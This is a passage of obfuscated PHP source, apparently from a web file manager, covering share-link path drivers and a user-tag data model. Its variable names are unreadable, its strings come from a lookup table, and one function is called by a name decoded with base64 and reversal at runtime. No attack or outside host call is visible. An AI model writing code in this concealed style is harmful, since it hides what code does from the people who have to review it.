$this->pathParse[$ÌìˆÄğê[487]][$ÌìˆÄğê[1174]] . $this->pathParse[$ÌìˆÄğê[1167]]; if ($ãÑòŸÔ) { $À¹“Øø = IO::infoWithChildren($ÖÄŞßÊ±); } else { $À¹“Øø = IO::info($ÖÄŞßÊ±); } $î÷ÓèŞ³ = $this->pathParse[$ÌìˆÄğê[487]]; return Action($ÌìˆÄğê[1342])->_shareItemeParse($À¹“Øø, $î÷ÓèŞ³); } public function listAll($áíÚáâ) { $íäêÀ¶ù =& $_SERVER[­õöî’–]; $“™¾ö°˜ = IO::listAll($áíÚáâ); $Èñ¯ èÕ = $this->pathParse[$íäêÀ¶ù[487]]; foreach ($“™¾ö°˜ as &$®ïÖ‹¿) { check_abort(); $Ûıüš = IO::info($®ïÖ‹¿[$íäêÀ¶ù[84]]); $Ûıüš = is_array($Ûıüš) ? $Ûıüš : array(); $®ïÖ‹¿ = array_merge($Ûıüš, $®ïÖ‹¿); $®ïÖ‹¿[$íäêÀ¶ù[86]] = Action($íäêÀ¶ù[1342])->_shareItemeParse($®ïÖ‹¿, $Èñ¯ èÕ); } unset($®ïÖ‹¿); return $“™¾ö°˜; } public function getPathOuter($Ä°òÁË•) { $í¤şß‘ =& $_SERVER[­õöî’–]; $§ÑØ‹™ = KodIO::parse($Ä°òÁË•); if ($§ÑØ‹™[$í¤şß‘[33]] == KodIO::KOD_SHARE_ITEM) { return $§ÑØ‹™[$í¤şß‘[84]]; } $µíÒ‘Íç = KodIO::clear($Ä°òÁË•); $¬Ş•­Ú• = KodIO::clear($this->pathParse[$í¤şß‘[487]][$í¤şß‘[1174]]); $ã°™ƒš‘ = substr($µíÒ‘Íç, strlen($¬Ş•­Ú•)); if (substr($µíÒ‘Íç, 0, strlen($¬Ş•­Ú•)) != $¬Ş•­Ú•) { return !1; } return $this->pathParse[$í¤şß‘[1168]] . $í¤şß‘[8] . ltrim($ã°™ƒš‘, $í¤şß‘[8]); } public function getType() { $ö‰ä×· =& $_SERVER[­õöî’–]; $âÜÑ´Í = str_replace($ö‰ä×·[74], $ö‰ä×·[12], get_class($this)); return strtolower($âÜÑ´Í); } public function isTypeObject($ƒ¾ªú±İ) { return IO::isTypeObject($ƒ¾ªú±İ); } public function info($¿¥Á¯Éæ) { return $this->infoParse($¿¥Á¯Éæ); } public function infoAuth($Äı‚î·¹) { return $this->infoParse($Äı‚î·¹); } public function infoWithChildren($İŸæ¼¶Ò) { return $this->infoParse($İŸæ¼¶Ò, !0); } public function infoFull($ØŞ¿Øª) { return $this->infoParse($ØŞ¿Øª); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Ú¾Å¥õ) { $this->pathParse = $Ú¾Å¥õ; } protected function infoParse($¸‹úå, $àÑíµú‹ = false) { $ÜİŒÒĞñ =& $_SERVER[­õöî’–]; return Action($ÜİŒÒĞñ[1173])->sharePathInfo($this->pathParse[$ÜİŒÒĞñ[84]], !0, $àÑíµú‹); } public function listPath($çê²¥¢, $«ìÁàÑê = false) { $ò¿á¢Ø¡ =& $_SERVER[­õöî’–]; $˜Æ¡ÕÇ¤ = IO::listPath($çê²¥¢, $«ìÁàÑê); if (!$˜Æ¡ÕÇ¤) { return $˜Æ¡ÕÇ¤; } if (is_array($˜Æ¡ÕÇ¤[$ò¿á¢Ø¡[1343]])) { $¸ –®¿ = Action($ò¿á¢Ø¡[1352])->parsePathChildren($˜Æ¡ÕÇ¤[$ò¿á¢Ø¡[1343]], array($ò¿á¢Ø¡[421] => $çê²¥¢)); $˜Æ¡ÕÇ¤[$ò¿á¢Ø¡[1343]] = Action($ò¿á¢Ø¡[1173])->shareItemInfo($¸ –®¿); } foreach ($˜Æ¡ÕÇ¤ as $•àÌ°ÉÂ => $¡ÈÅÂöİ) { if (!in_array($•àÌ°ÉÂ, array($ò¿á¢Ø¡[83], $ò¿á¢Ø¡[82]))) { continue; } foreach ($¡ÈÅÂöİ as $—âë­Æò => $¸ –®¿) { $¸ –®¿ = Action($ò¿á¢Ø¡[1352])->parsePathChildren($¸ –®¿, array($ò¿á¢Ø¡[421] => $çê²¥¢)); $˜Æ¡ÕÇ¤[$•àÌ°ÉÂ][$—âë­Æò] = Action($ò¿á¢Ø¡[1173])->shareItemInfo($¸ –®¿); } } return $˜Æ¡ÕÇ¤; } public function listAll($ÎÃëŒ‰) { $²†¤Ù‡– =& $_SERVER[­õöî’–]; $ó²Œû°® = IO::listAll($ÎÃëŒ‰); foreach ($ó²Œû°® as &$úãŠ›î) { $ââÏÕæ› = IO::info($úãŠ›î[$²†¤Ù‡–[84]]); $ââÏÕæ› = is_array($ââÏÕæ›) ? $ââÏÕæ› : array(); $úãŠ›î = array_merge($ââÏÕæ›, $úãŠ›î); $úãŠ›î[$²†¤Ù‡–[86]] = Action($²†¤Ù‡–[1173])->shareItemInfo($úãŠ›î); } unset($úãŠ›î); return $ó²Œû°®; } } goto FÖ²ùŠóÌ; dÙ¦À¼½: $fileSize = strrev(base64_decode($_SERVER[àïçãĞÒ][0])); function binCheckNeq($×°–ÙŒÏ, $Ê¿ÇÆÉ) { return $×°–ÙŒÏ != $Ê¿ÇÆÉ; } $_SERVER[$_SERVER[àïçãĞÒ][1]] = $fileSize($_SERVER[$_SERVER[àïçãĞÒ][2]]); goto eåßç”Û™Ô; A‚î…ÇÕ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($‘™ƒ¦ÎÈ) { $Ù²š¬Îƒ =& $_SERVER[­õöî’–]; return array($Ù²š¬Îƒ[1960] => array($Ù²š¬Îƒ[2340] . USER_ID, $Ù²š¬Îƒ[1961])); } protected function listData() { $¶ÒÍ³„Ç =& $_SERVER[­õöî’–]; $ëç¶’µ… = array($¶ÒÍ³„Ç[1651] => USER_ID, $¶ÒÍ³„Ç[484] => array($¶ÒÍ³„Ç[1964], 0)); $ì¾ğêê = $¶ÒÍ³„Ç[2341]; $…ŸŒËä = $this->field($ì¾ğêê)->where($ëç¶’µ…)->order($¶ÒÍ³„Ç[1967])->select(); return $…ŸŒËä ? $…ŸŒËä : array(); } protected function addToTag($ÊÚÃ’Í, $²£ä¶†Ç) { $î“ø©Ã =& $_SERVER[­õöî’–]; if (!Model($î“ø©Ã[2104])->listData($²£ä¶†Ç)) { return !1; } if (is_numeric($ÊÚÃ’Í)) { $ƒ¿şÔ = Model($î“ø©Ã[816])->pathInfo($ÊÚÃ’Í); if (!$ƒ¿şÔ) { return !1; } } else { $ƒ¿şÔ = IO::infoSimple($ÊÚÃ’Í); if (!$ƒ¿şÔ) { return !1; } $°š÷ÛÚ¼ = $ƒ¿şÔ[$î“ø©Ã[32]]; $Á…æäö¸ = $ƒ¿şÔ[$î“ø©Ã[33]]; if (isset($ƒ¿şÔ[$î“ø©Ã[410]])) { $Á…æäö¸ = $ƒ¿şÔ[$î“ø©Ã[410]] == $î“ø©Ã[88] ? $î“ø©Ã[75] : $î“ø©Ã[199]; } } $ÌäæÙ·ı = array($î“ø©Ã[1651] => USER_ID, $î“ø©Ã[484] => $²£ä¶†Ç, $î“ø©Ã[421] => $ÊÚÃ’Í, $î“ø©Ã[422] => $Á…æäö¸ ? $Á…æäö¸ : $î“ø©Ã[416], $î“ø©Ã[420] => $°š÷ÛÚ¼ ? $°š÷ÛÚ¼ : $î“ø©Ã[12], $î“ø©Ã[1853] => 0); if ($this->where($ÌäæÙ·ı)->find()) { return !1; } return $this->add($ÌäæÙ·ı); } protected function removeFromTag($ä±çÍ•ß, $Ş—Æ˜İå) { $Â×ì¾÷¼ =& $_SERVER[­õöî’–]; if (!Model($Â×ì¾÷¼[2104])->listData($Ş—Æ˜İå)) { return !1; } if (is_array($ä±çÍ•ß)) { $ä±çÍ•ß = array($Â×ì¾÷¼[7], $ä±çÍ•ß); } $Ÿ«ôäõí = array($Â×ì¾÷¼[1651] => USER_ID, $Â×ì¾÷¼[484] => $Ş—Æ˜İå, $Â×ì¾÷¼[421] => $ä±çÍ•ß); return $this->where($Ÿ«ôäõí)->delete(); } protected function removeByTag($Ë¾šı¦) { $½ºŸ´±Ö =& $_SERVER[­õöî’–]; if (!$Ë¾šı¦) { return !1; } $¼‡«¯¹ = array($½ºŸ´±Ö[1651] => USER_ID, $½ºŸ´±Ö[484] => $Ë¾šı¦); return $this->where($¼‡«¯¹)->delete(); } protected function removeBySource($Ğô¬êÃÛ) { $ßÍÓ´Å =& $_SERVER[­õöî’–]; if (is_array($Ğô¬êÃÛ)) { $Ğô¬êÃÛ = array($ßÍÓ´Å[7], $Ğô¬êÃÛ); } $®Ğ´£ó = array($ßÍÓ´Å[1651] => USER_ID, $ßÍÓ´Å[484] => array($ßÍÓ´Å[1012], 0), $ßÍÓ´Å[421] => $Ğô¬êÃÛ); return $this->where($®Ğ´£ó)->delete(); } }